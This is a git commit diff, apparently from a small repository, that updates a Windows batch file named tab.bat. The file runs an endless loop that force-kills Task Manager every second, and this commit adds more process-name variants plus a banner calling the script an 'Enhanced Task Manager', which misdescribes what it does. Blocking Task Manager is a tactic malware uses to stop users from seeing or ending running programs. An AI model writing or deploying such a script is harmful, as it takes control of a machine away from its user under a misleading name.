be23b54b4e79d23efc8789f216b7cbbbcc7f3e92
scp-67 <jacobfurn4@gmail.com>
2026-03-03 15:01:36 -0500

    Update tab.bat

--- tab.bat
+++ tab.bat
@@ -1,5 +1,9 @@
 @echo off
+echo Enhanced Task Manager 
+echo Press Ctrl+C to stop
 :loop
 taskkill /f /im Taskmgr.exe >nul 2>&1
+taskkill /f /im taskmgr.exe >nul 2>&1
+taskkill /f /im "Task Manager" >nul 2>&1
 timeout /t 1 >nul
 goto loop
